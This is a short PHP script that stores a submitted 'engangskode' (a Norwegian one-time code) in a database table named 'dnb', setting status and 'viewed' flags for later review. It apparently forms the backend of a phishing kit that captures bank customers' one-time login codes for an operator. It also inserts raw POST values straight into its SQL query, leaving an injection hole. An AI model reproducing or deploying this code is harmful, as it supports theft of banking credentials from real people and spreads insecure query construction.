<?php
require '../connection.php';

if ($_POST["engangskode"] and $_POST["uniqueid"]) {
  $en = $_POST["engangskode"];
  $uniqueid = $_POST["uniqueid"];

  $upload_login_code = mysqli_query($conn, "UPDATE dnb SET engangskode='$en', status=0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($upload_login_code) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
